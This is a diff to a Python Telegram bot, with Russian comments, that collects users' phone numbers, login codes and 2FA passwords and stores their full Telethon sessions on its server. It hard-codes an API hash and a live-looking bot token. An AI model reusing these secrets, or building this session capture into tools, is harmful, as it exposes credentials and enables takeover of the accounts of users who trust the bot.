@@ -8,11 +8,10 @@ from typing import Dict
 # --- AIOGRAM IMPORTS ---
 from aiogram import Bot, Dispatcher, Router, types, F
 from aiogram.enums import ParseMode
-from aiogram.filters import CommandStart
+from aiogram.filters import CommandStart, StateFilter # 🛠️ ДОБАВЛЕН ИМПОРТ StateFilter
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
 from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, BufferedInputFile
-# 🛠️ ИСПРАВЛЕНИЕ: Добавлен импорт для aiogram 3.7+
 from aiogram.client.default import DefaultBotProperties 
 
 # --- TELETHON IMPORTS ---
@@ -28,12 +27,12 @@ logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(
 logger = logging.getLogger(__name__)
 
 # =========================================================================
-# I. КОНФИГУРАЦИЯ (ВАШИ КЛЮЧИ)
+## 🔑 I. КОНФИГУРАЦИЯ (ВАШИ КЛЮЧИ)
 # =========================================================================
 
 API_ID = 29930612
 API_HASH = "2690aa8c364b91e47b6da1f90a71f825"
-# 🎯 НОВЫЙ ТОКЕН, ВСТАВЛЕН
+# 🎯 ВАШ НОВЫЙ ТОКЕН
 BOT_TOKEN = "7868097991:AAEH_ftVuHXPe0428PpginsnAjF8iII1PZ8" 
 
 USER_SESSION_DIR = "sessions"
@@ -43,7 +42,7 @@ if not os.path.exists(USER_SESSION_DIR):
     os.makedirs(USER_SESSION_DIR)
 
 # =========================================================================
-# II. ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ И УТИЛИТЫ
+## 🛠️ II. УТИЛИТЫ И ПЕРЕМЕННЫЕ
 # =========================================================================
 
 TEMP_AUTH_CLIENTS: Dict[int, TelegramClient] = {}
@@ -60,37 +59,34 @@ def get_display_name(user: User) -> str:
     return " ".join(parts) if parts else "Unknown User"
 
 # =========================================================================
-# III. FSM СОСТОЯНИЯ ДЛЯ АВТОРИЗАЦИИ
+## 🚦 III. FSM СОСТОЯНИЯ
 # =========================================================================
 
 class TelethonAuth(StatesGroup):
-    PHONE = State()     # Ожидание ввода номера телефона
-    CODE = State()      # Ожидание ввода кода
-    PASSWORD = State()  # Ожидание ввода 2FA пароля
+    PHONE = State()
+    CODE = State()
+    PASSWORD = State()
 
 # =========================================================================
-# IV. КЛАВИАТУРЫ
+## ⌨️ IV. КЛАВИАТУРЫ
 # =========================================================================
 
 def get_start_kb() -> InlineKeyboardMarkup:
-    """Клавиатура для начала авторизации."""
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="📞 Вход по Номеру/Коду", callback_data="telethon_auth_phone_start")],
         [InlineKeyboardButton(text="🔙 Отмена", callback_data="cancel_action")],
     ])
 
 def get_cancel_kb() -> InlineKeyboardMarkup:
-    """Клавиатура для отмены действия."""
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="🔙 Отмена", callback_data="cancel_action")],
     ])
 
 # =========================================================================
-# V. ОСНОВНЫЕ ХЭНДЛЕРЫ И НАСТРОЙКА BOT (С ИСПРАВЛЕНИЕМ)
+## 🤖 V. ОСНОВНЫЕ ХЭНДЛЕРЫ И НАСТРОЙКА BOT
 # =========================================================================
 
 router = Router()
-# Инициализация BOT с ИСПРАВЛЕНИЕМ для aiogram 3.7+
 default_properties = DefaultBotProperties(parse_mode=ParseMode.MARKDOWN)
 bot = Bot(token=BOT_TOKEN, default=default_properties)
 
@@ -118,12 +114,10 @@ async def logout_session(callback: types.CallbackQuery, state: FSMContext):
     await state.clear()
 
     try:
-        # Безопасно удаляем временный клиент
         client_to_disconnect = TEMP_AUTH_CLIENTS.pop(user_id, None)
         if client_to_disconnect:
             await client_to_disconnect.disconnect()
             
-        # Удаляем финальный файл сессии
         session_path = get_session_path(user_id) + '.session'
         if os.path.exists(session_path):
             os.remove(session_path)
@@ -133,20 +127,16 @@ async def logout_session(callback: types.CallbackQuery, state: FSMContext):
         logger.error(f"Error during logout for {user_id}: {e}")
         await callback.message.edit_text(f"❌ Ошибка при удалении сессии: {type(e).__name__}", reply_markup=get_start_kb())
 
-
 # =========================================================================
-# VI. ХЭНДЛЕРЫ TELETHON АВТОРИЗАЦИИ (FSM: PHONE/CODE/PASSWORD)
+## 📞 VI. ХЭНДЛЕРЫ TELETHON АВТОРИЗАЦИИ
 # =========================================================================
 
-# --- УТИЛИТА ЗАВЕРШЕНИЯ ВХОДА ---
 async def finalize_telethon_login(user_id, client: TelegramClient, state: FSMContext, message_or_callback):
     """Финальный этап после успешного sign_in."""
     
-    # 1. Переносим файл сессии
     temp_path = get_session_path(user_id) + '_temp.session'
     final_path = get_session_path(user_id) + '.session'
     
-    # 2. Очищаем временные данные
     try:
         if os.path.exists(temp_path):
             if os.path.exists(final_path):
@@ -159,7 +149,6 @@ async def finalize_telethon_login(user_id, client: TelegramClient, state: FSMCon
         if user_id in TEMP_AUTH_CLIENTS:
             del TEMP_AUTH_CLIENTS[user_id]
                 
-    # 3. Отправляем финальное сообщение
     try:
         me = await client.get_me()
         username = f"@{me.username}" if me.username else "Нет юзернейма"
@@ -195,7 +184,6 @@ async def start_telethon_auth_phone(callback: types.CallbackQuery, state: FSMCon
             del TEMP_AUTH_CLIENTS[user_id]
         
         temp_path = get_session_path(user_id) + '_temp'
-        # Создаем клиента Telethon
         temp_client = TelegramClient(temp_path, API_ID, API_HASH, proxy=PROXY_CONFIG, device_model='Android Client')
         TEMP_AUTH_CLIENTS[user_id] = temp_client
         
@@ -229,7 +217,6 @@ async def process_phone(message: types.Message, state: FSMContext):
     try:
         await message.answer("⏳ Отправляю код...")
         await client.connect() 
-        # ЗАПРОС КОДА
         sent_code_hash = await client.send_code_request(phone)
         
         await state.update_data(phone=phone, sent_code_hash=sent_code_hash)
@@ -245,7 +232,6 @@ async def process_phone(message: types.Message, state: FSMContext):
     except FloodWaitError as e:
         await message.answer(f"❌ Ограничение Telegram: Повторите попытку через **{e.seconds}** секунд.", reply_markup=get_cancel_kb())
     except SessionPasswordNeededError:
-        # Если нужен 2FA, пропускаем шаг кода
         await state.set_state(TelethonAuth.PASSWORD)
         await message.answer(
             "🔒 **Шаг 3/3: Требуется двухфакторная аутентификация (2FA)**\n"
@@ -277,10 +263,8 @@ async def process_code(message: types.Message, state: FSMContext):
     try:
         await message.answer("⏳ Проверяю код...")
         
-        # ВХОД С КОДОМ
         await client.sign_in(data['phone'], code, phone_code_hash=data['sent_code_hash'].phone_code_hash)
         
-        # Успешный вход!
         await finalize_telethon_login(user_id, client, state, message)
         
     except PhoneCodeInvalidError:
@@ -315,10 +299,8 @@ async def process_password(message: types.Message, state: FSMContext):
     try:
         await message.answer("⏳ Проверяю пароль...")
         
-        # ВХОД С ПАРОЛЕМ
         await client.sign_in(password=password)
         
-        # Успешный вход!
         await finalize_telethon_login(user_id, client, state, message)
         
     except PasswordHashInvalidError:
@@ -327,14 +309,14 @@ async def process_password(message: types.Message, state: FSMContext):
         logger.error(f"Password input error for {user_id}: {e}")
         await message.answer(f"❌ Неизвестная ошибка при вводе пароля: {type(e).__name__}", reply_markup=get_cancel_kb())
 
-# --- ГЛОБАЛЬНАЯ ОТМЕНА ДЕЙСТВИЯ FSM ---
-@router.callback_query(F.data == "cancel_action", state="*")
+# --- ГЛОБАЛЬНАЯ ОТМЕНА ДЕЙСТВИЯ FSM (ИСПРАВЛЕНО) ---
+# 🛠️ Теперь используем StateFilter('*') для отлова в любом состоянии FSM.
+@router.callback_query(F.data == "cancel_action", StateFilter('*')) 
 async def cancel_handler(callback: types.CallbackQuery, state: FSMContext):
     await callback.answer("Действие отменено.")
         
     user_id = callback.from_user.id
     
-    # Очистка временного клиента
     client_to_disconnect = TEMP_AUTH_CLIENTS.pop(user_id, None) 
     if client_to_disconnect:
         try:
@@ -348,7 +330,7 @@ async def cancel_handler(callback: types.CallbackQuery, state: FSMContext):
     await callback.message.edit_text("🏠 Главное меню:", reply_markup=get_start_kb())
 
 # =========================================================================
-# VII. ЗАПУСК БОТА
+## 🚀 VII. ЗАПУСК БОТА
 # =========================================================================
 
 async def main() -> None:
